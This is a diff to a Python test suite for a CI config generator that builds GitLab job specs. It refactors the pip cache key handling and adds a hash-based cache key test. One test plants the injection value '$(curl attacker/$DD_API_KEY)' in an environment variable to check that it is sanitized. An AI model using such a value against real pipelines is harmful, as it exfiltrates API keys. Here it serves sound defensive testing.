@@ -64,8 +64,7 @@ def test_get_bool_env_only_allows_literal_true(gen_gitlab_config_mod, monkeypatc
 def test_jobspec_sanitizes_nightly_build_before_script(gen_gitlab_config_mod, monkeypatch):
     monkeypatch.setenv("NIGHTLY_BUILD", "$(curl attacker/$DD_API_KEY)")
 
-    with mock.patch.object(gen_gitlab_config_mod.subprocess, "check_output", return_value=b"pip-key\n"):
-        config = str(gen_gitlab_config_mod.JobSpec(name="suite", stage="core"))
+    config = str(gen_gitlab_config_mod.JobSpec(name="suite", stage="core"))
 
     assert '    - export NIGHTLY_BUILD="false"' in config
     assert "$(curl" not in config
@@ -73,11 +72,11 @@ def test_jobspec_sanitizes_nightly_build_before_script(gen_gitlab_config_mod, mo
 
 
 def test_jobspec_uses_uv_test_template(gen_gitlab_config_mod):
-    with mock.patch.object(gen_gitlab_config_mod.subprocess, "check_output", return_value=b"pip-key\n"):
-        config = str(gen_gitlab_config_mod.JobSpec(name="suite", stage="core"))
+    config = str(gen_gitlab_config_mod.JobSpec(name="suite", stage="core", pip_cache_key="pip-key"))
 
     assert "  extends: .test_base_uv" in config
     assert "  UV_CACHE_DIR: ${CI_PROJECT_DIR}/.cache/uv" in config
+    assert "  PIP_CACHE_KEY: pip-key" in config
 
 
 def test_jobspec_waits_for_services_through_uv(gen_gitlab_config_mod):
@@ -87,8 +86,7 @@ def test_jobspec_waits_for_services_through_uv(gen_gitlab_config_mod):
         services=["redis"],
         python_versions={"3.12"},
     )
-    with mock.patch.object(gen_gitlab_config_mod.subprocess, "check_output", return_value=b"pip-key\n"):
-        config = str(spec)
+    config = str(spec)
 
     assert '          - PYTHON_VERSION: "3.9"' in config
     assert '          - PYTHON_VERSION: "3.12"' in config
@@ -130,3 +128,15 @@ def test_collect_all_suite_venv_info_rejects_overlapping_suite_membership(gen_gi
                     "tracer-uwsgi": "tracer-uwsgi",
                 }
             )
+
+
+def test_requirements_cache_key_matches_sorted_lock_contents(gen_gitlab_config_mod, monkeypatch, tmp_path):
+    requirements = tmp_path / ".riot" / "requirements"
+    requirements.mkdir(parents=True)
+    (requirements / "abc1234.txt").write_text("z-package==1\na-package==1\n")
+    (requirements / "def5678.txt").write_text("m-package==1\n")
+    monkeypatch.setattr(gen_gitlab_config_mod, "ROOT", tmp_path)
+
+    expected = gen_gitlab_config_mod.hashlib.sha256(b"a-package==1\nm-package==1\nz-package==1\n").hexdigest()
+
+    assert gen_gitlab_config_mod.requirements_cache_key({"def5678", "abc1234"}) == expected
